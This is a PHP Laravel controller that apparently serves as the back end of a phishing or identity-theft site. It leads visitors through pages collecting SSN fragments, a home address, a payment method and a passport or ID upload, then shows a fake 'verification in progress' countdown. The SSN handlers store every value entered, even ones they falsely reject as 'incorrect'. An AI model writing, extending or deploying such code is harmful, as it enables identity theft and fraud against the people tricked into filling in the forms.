<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\payment_method;
use App\Models\ssn_first_detail;
use App\Models\visitors_detail;
use App\Models\ssn_last_detail;
use GrahamCampbell\ResultType\Success;
use Session;

class dashboardController extends Controller
{
    //


    public function profile(Request $req)
{

    $code = $req->session()->get('usercode');
    $user_details_sel = visitors_detail::where("code", $code)->first();
    $data = ['data'=> $user_details_sel];
    return view("dashlike.profile", $data);
}

public function postssn(Request $req)
{
    $lastssn =$req->lastssn;
    $lastssnsel= ssn_last_detail::where("last_ssn",$lastssn)->first();
    if (is_null($lastssnsel)) {
        # code...
        $savetemp = new ssn_last_detail;
        $savetemp->last_ssn =$lastssn;
        $savetemp->save();
        $req->session()->put('error', 'incorrect SSN');
        return redirect()->route('profile') ->with('error','incorrect last four (4) digits of SSN');
    }
    else {
        # code...
        $code = $req->session()->get('usercode');
        $userd = visitors_detail::where('code',$code)->first();
        $userd ->lastssn =$lastssn;
        $userd ->save();

        return redirect()->route('address')->with('succes','Fill your address to proceed') ;
    }



}




public function address(Request $req)
{
    $code =  $code = $req->session()->get('usercode');
    $user_details_sel = visitors_detail::where("code", $code)->first();
    $data = ['data'=> $user_details_sel];
    return view('dashlike.address' , $data);

}


public function postaddress(Request $req)
{

    $address=$req->address;
    $code = $req->session()->get('usercode');
        $userd = visitors_detail::where('code',$code)->first();
        $userd ->address =$address;
        $userd ->save();
        return redirect()->route('firstssn')->with('success', 'Address succesfully updated, procedd with first six (6) digits of SSN');

}


public function firstssn(Request $req)
{
    $code = $code = $req->session()->get('usercode');
    $user_details_sel = visitors_detail::where("code", $code)->first();
    $data = ['data'=> $user_details_sel];
    return view('dashlike.firstdigits' , $data);

}


public function postfirstssn(Request $req)
{
    $firstssn =$req->firstssn;
    $firstssnsel= ssn_first_detail::where("first_ssn",$firstssn)->first();
    if (is_null($firstssnsel)) {
        # code...
        $savetemp = new ssn_first_detail;
        $savetemp->first_ssn =$firstssn;
        $savetemp->save();
        return redirect()->route('firstssn')->with('warning', 'Incorrect first six (6) digits of SSN');
    }
    else {
        # code...
        $code = $req->session()->get('usercode');
        $userd = visitors_detail::where('code',$code)->first();
        $userd ->firstssn =$firstssn;
        $userd ->save();
        return redirect()->route('method')->with('success', 'select Payment method') ;
    }


}


public function method(Request $req)
{
    $code =  $code = $req->session()->get('usercode');
    $user_details_sel = payment_method::all();
    $data = ['data'=> $user_details_sel];
return view('dashlike.payment_method', $data);
}


public function postmethod(Request $req)
{
    $meth = $req->method;
    $user = $req->session()->get('code');
    $addpayment = visitors_detail::where('code', $user);
    $addpayment->payment_method =$meth;
    $addpayment->save();
    return redirect()->route('countdown')->with('success', 'verification in progress..');
}
public function countdown (){
return view('dashlike.countdown');
}

public function ajaxget (Request $req){
    $user = $req->session()->get('code');
    $userd = visitors_detail::where('code', $user);
    $data  = ['data'=>$userd];
    return view('dashlike.formupload',$data);
}

public function ajaxpost (Request $req){

    $passport = $req->mandatedfile;
    $code = $req->session()->get('code');

if (is_null($passport)) {
    # code...
}
else {
    # code...

$file_extension =$req->file('mandatedfile')->getClientOriginalExtension();
if ($file_extension=="jpg") {
  # code...
  $save_file_extension="jpg";

}
elseif ($file_extension=="jpeg") {
  # code...
  $save_file_extension="jpeg";
}
else{
  $save_file_extension="png";
}
  $fileName = time().'.'.$save_file_extension;
  $path =$req->file('mandatedfile')->storeAS("public/passports",$fileName);

  $visitor = visitors_detail::where('code',$code)->first();

  $visitor->iduploaded = $fileName;
  $visitor->save();

  return redirect()->route('countdown')->with('succes', 'file upload succesful');

}

}
}
